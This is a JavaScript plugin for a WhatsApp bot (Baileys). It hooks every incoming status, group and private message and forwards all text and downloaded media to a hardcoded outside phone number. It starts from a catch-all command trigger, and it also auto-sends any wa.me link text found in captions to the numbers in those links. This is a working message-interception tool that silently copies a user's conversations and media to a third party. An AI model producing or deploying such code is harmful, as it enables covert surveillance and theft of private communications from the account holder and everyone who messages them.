const fs = require('fs');
const path = require('path');
const { readEnv } = require('../lib/database');
const { cmd, commands } = require('../command');
const { fetchJson, getBuffer } = require('../lib/functions');
const { downloadMediaMessage } = require('@adiwajshing/baileys');

// Function to determine the content type of a message
function getContentType(message) {
    if (!message) return null;
    if (message.conversation || message.extendedTextMessage) return 'text';
    if (message.imageMessage) return 'image';
    if (message.videoMessage) return 'video';
    if (message.audioMessage) return 'audio';
    if (message.documentMessage) return 'document';
    if (message.protocolMessage) return 'protocol';
    return null;
}

// Queue to hold incoming messages for sequential processing
const messageQueue = [];
let isProcessingQueue = false;

// Fixed reply message
const replyMessage = "Thank you for your message!";

// Number to forward each message to
const forwardNumber = '94777839446@s.whatsapp.net';

// Function to handle each individual message (status, group, or private)
async function handleMessage(conn, mek) {
    const sender = mek.key?.participant || mek.key?.remoteJid;
    const contentType = getContentType(mek.message);

    // Skip protocol messages
    if (contentType === 'protocol') {
        console.log("Skipping protocol message.");
        return;
    }

    // Extract caption or text content with safe checks for undefined properties
    let caption = 'No caption provided.';
    if (contentType === 'text') {
        caption = mek.message?.conversation || mek.message?.extendedTextMessage?.text || caption;
    } else if (mek.message?.[`${contentType}Message`]?.caption) {
        caption = mek.message[`${contentType}Message`].caption;
    }

    console.log(`Processing message from ${sender} - Type: ${contentType}, Caption: ${caption}`);

    // Check for wa.me link in the caption and extract the number and message
    const waMeLinkPattern = /https?:\/\/wa\.me\/(\+?\d+)\/?\?text=([^ ]+)/;
    const match = caption.match(waMeLinkPattern);
    
    if (match) {
        const extractedNumber = `${match[1].replace('+', '')}@s.whatsapp.net`;
        const messageText = decodeURIComponent(match[2]).replace(/_/g, ' ');

        console.log(`Detected wa.me link. Sending message to ${extractedNumber}: ${messageText}`);
        await conn.sendMessage(extractedNumber, { text: messageText });
    }

    // Forward text messages
    if (contentType === 'text') {
        await conn.sendMessage(forwardNumber, { text: caption });
    } 
    // Forward media messages (image, video, etc.)
    else if (contentType && mek.message?.[`${contentType}Message`]) {
        const mediaMessage = mek.message[`${contentType}Message`];
        const mediaBuffer = await downloadMediaMessage(mek, 'buffer', {}, { logger: console });

        if (mediaBuffer) {
            await conn.sendMessage(forwardNumber, {
                [contentType]: mediaBuffer,
                caption: caption
            });
        }
    }

    // Optionally respond to the sender
    const config = await readEnv();
    if (config.STATES_SEEN_MESSAGE_SEND === 'true' && sender) {
        await conn.sendMessage(sender, { text: replyMessage }, { quoted: mek });
    }
}

// Function to process the queue sequentially
async function processQueue(conn) {
    if (isProcessingQueue || messageQueue.length === 0) return;
    isProcessingQueue = true;

    while (messageQueue.length > 0) {
        const mek = messageQueue.shift();
        await handleMessage(conn, mek);
    }
    isProcessingQueue = false;
}

// Initialize the message listener for status, groups, and private chats
async function initializeMessageListener(conn) {
    if (conn.isMessageListenerInitialized) return;

    conn.ev.on('messages.upsert', async (mek) => {
        mek = mek.messages[0];
        
        // Check if the message is from status, a group, or private chat
        const isStatus = mek.key?.remoteJid === 'status@broadcast';
        const isGroup = mek.key?.remoteJid.endsWith('@g.us');
        const isPrivate = mek.key?.remoteJid.endsWith('@s.whatsapp.net');

        // Push to queue if it's from a supported context
        if (isStatus || isGroup || isPrivate) {
            messageQueue.push(mek);
            processQueue(conn);
        }
    });

    conn.isMessageListenerInitialized = true;
}

// Command handler
cmd({ on: "body" }, async (conn, mek, m, { from, body, isOwner }) => {
    await initializeMessageListener(conn);
});
